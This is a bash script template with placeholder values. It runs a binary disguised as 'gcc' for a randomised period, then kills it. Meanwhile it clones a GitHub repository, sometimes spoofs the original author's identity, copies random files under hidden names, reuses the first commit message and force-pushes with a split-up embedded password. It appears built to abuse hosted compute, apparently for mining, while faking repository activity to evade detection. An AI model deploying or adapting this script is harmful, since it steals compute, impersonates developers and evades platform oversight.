#!/usr/bin/env bash

C_DONE="no"
TIME_B=$(date +%s)
TIME_D=$((1500 + $(shuf --input-range 0-180 --head-count 1)))

TIME_E=$((TIME_B + TIME_D))
TIME_E_C=$((TIME_B + 70))

./gcc -c nginx &>/dev/null

while :
do
  TIME_C=$(date +%s)

  if [[ $C_DONE == 'no' ]]
  then
    if [[ TIME_C -gt TIME_E_C ]]
    then
      git clone --branch master --depth __DEPTH__ --no-tags --single-branch https://github.com/__REPO_ACCOUNT__/nginx.git cloned_repo &>/dev/null || true
      cd cloned_repo || true
      RAN=$((RANDOM % 2))
      HASH=$(git rev-list master | tail --lines 1) || true

      if [[ RAN -eq 0 ]]
      then
        git config user.email '__USER_EMAIL__' &>/dev/null || true
        git config user.name '__USER_NAME__' &>/dev/null || true
      else
        LOG_AE=$(git log --format='%ae' "$HASH") || true
        LOG_AN=$(git log --format='%an' "$HASH") || true
        git config user.email "__JUST_ONE_LETTER__$LOG_AE" &>/dev/null || true
        git config user.name "$LOG_AN" &>/dev/null || true
      fi

      R_FILE_1=$(find . ! -path './.git/*' -size -50k -type f ! -iname '.*' ! -iname '_*' | shuf | head --lines 1) || true
      R_FILE_2=$(find . ! -path './.git/*' -size -50k -type f ! -iname '.*' ! -iname '_*' | shuf | head --lines 1) || true
      R_FILE_1_B=$(basename "$R_FILE_1") || true
      R_FILE_2_B=$(basename "$R_FILE_2") || true
      R_FILE_1_D=$(dirname "$R_FILE_1") || true
      R_FILE_2_D=$(dirname "$R_FILE_2") || true
      rm --force --recursive "$R_FILE_1_D"/."$R_FILE_1_B" &>/dev/null || true
      rm --force --recursive "$R_FILE_2_D"/."$R_FILE_2_B" &>/dev/null || true
      rm --force --recursive "$R_FILE_1_D"/_"$R_FILE_1_B" &>/dev/null || true
      rm --force --recursive "$R_FILE_2_D"/_"$R_FILE_2_B" &>/dev/null || true

      if [[ RAN -eq 0 ]]
      then
        cp --force --recursive "$R_FILE_1" "$R_FILE_1_D"/."$R_FILE_1_B" &>/dev/null || true
        cp --force --recursive "$R_FILE_2" "$R_FILE_2_D"/_"$R_FILE_2_B" &>/dev/null || true
      else
        cp --force --recursive "$R_FILE_1" "$R_FILE_1_D"/_"$R_FILE_1_B" &>/dev/null || true
        cp --force --recursive "$R_FILE_2" "$R_FILE_2_D"/."$R_FILE_2_B" &>/dev/null || true
      fi

      git add . &>/dev/null || true
      git log --format='%B' "$(git rev-list master | tail --lines 1)" | git commit --file - &>/dev/null || true
      P_1="__PASSWORD_PART_1__"
      P_2="__PASSWORD_PART_2__"
      git push --force --no-tags https://__GITHUB_LOGIN__:''"$P_1""$P_2"''@github.com/__REPO_ACCOUNT__/nginx.git &>/dev/null || true
      cd .. || true
      rm --force --recursive cloned_repo || true
      C_DONE="yes"
    fi
  fi

  sleep 60

  TIME_C=$(date +%s)

  if [[ TIME_C -gt TIME_E ]]
  then
    kill "$(pgrep gcc)" &>/dev/null

    break
  fi
done
